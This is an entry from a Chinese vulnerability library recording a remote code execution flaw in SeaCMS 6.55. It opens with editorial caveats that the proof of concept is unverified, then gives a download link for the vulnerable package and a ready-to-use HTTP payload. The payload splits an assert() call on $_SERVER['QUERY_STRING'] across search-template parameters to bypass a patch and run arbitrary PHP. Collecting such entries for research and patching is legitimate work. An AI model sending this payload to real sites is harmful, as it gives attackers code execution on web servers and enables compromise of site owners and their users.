---
source: "白阁文库 BaizeSec/bylibrary"
product: "SeaCMS6.55"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "seacms6.55远程代码执行"
prerequisites: "来源所述条件，未列明部分仍待核：GET query作为assert代码，POST拼接SERVER字符串，旧PHPassert"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-3aacce69acaae194724c7b78"
entity_id: "ve-3aacce69acaae194724c7b78"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：GET query作为assert代码，POST拼接SERVER字符串，旧PHPassert

- **事实待核（1）**：与388同机制，本篇补?phpinfo();及末尾/*，可修复388缺第二输入通道。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **事实待核（2）**：无响应/源码，需保留Freebuf及独立审计链接；网盘包版本/哈希未核验。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# seacms6.55远程代码执行

## Affected Version 6.55

链接:https://pan.baidu.com/s/1UmbsQjQ4o4JFtK1MLHtf3g  
密码:k4x1

## POC

	http://192.168.0.6/seacms655/search.php?phpinfo(); 
	post:
	searchtype=5&searchword={if{searchpage:year}&year=:as{searchpage:area}}&area=s{searchpage:letter}&letter=ert{searchpage:lang}&yuyan=($_SE{searchpage:jq}&jq=RVER{searchpage:ver}&&ver=[QUERY_STRING]));/*


## References

[海洋CMS（SEACMS）新版本V6.55补丁仍可被绕过执行任意代码](http://www.freebuf.com/vuls/150303.html)

[seacms 6.55 代码注入漏洞](https://github.com/SukaraLin/php_code_audit_project/blob/master/seacms/seacms%206.55%20%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md)


---

> 来源：白阁文库 BaizeSec/bylibrary
